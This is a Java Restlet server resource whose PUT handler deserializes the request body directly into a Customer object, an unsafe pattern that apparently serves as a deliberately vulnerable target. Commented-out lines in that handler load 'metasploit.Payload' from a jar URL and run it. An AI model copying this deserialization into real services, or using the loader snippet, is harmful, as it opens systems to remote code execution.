import java.io.IOException;

import org.restlet.data.Status;
import org.restlet.representation.ObjectRepresentation;
import org.restlet.representation.Representation;
import org.restlet.resource.Get;
import org.restlet.resource.Put;
import org.restlet.resource.ServerResource;
import org.restlet.data.MediaType;

import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.net.URL;
import java.net.URLClassLoader;

public class CustomerResource extends ServerResource {

	@Get
	public ObjectRepresentation<Customer> getCustomer() {
		ObjectRepresentation<Customer> cust = new ObjectRepresentation<Customer>(new Customer());
		cust.setMediaType(MediaType.APPLICATION_JAVA_OBJECT_XML);
		return cust;
	}

	@Put
	public void storeItem(Representation entity) throws IOException { 
		ObjectRepresentation<Customer> repObject;
		try {
			// URLClassLoader u = new URLClassLoader(new URL[]{new URL("http://localhost/~alvaro/met.jar")});
			// Class c = u.loadClass("metasploit.Payload");
			// try {
			//    c.getMethod("main",new Class[]{Class.forName("[Ljava.lang.String;")}).invoke(null,new Object[]{new String[0]});
			// } catch (Exception e) {
			//    e.printStackTrace();
			// }

			//System.out.println(entity.getText());
			repObject = new ObjectRepresentation<Customer>(entity);
			Customer customer;
			customer = repObject.getObject();
			System.out.println("name : " + customer.name);
			System.out.println("firstname : " + customer.firstName);
			setStatus(Status.SUCCESS_OK);
		} catch (IllegalArgumentException e) { 
			e.printStackTrace();
		} catch (ClassNotFoundException e) { 
			e.printStackTrace();
		}	
	}

}
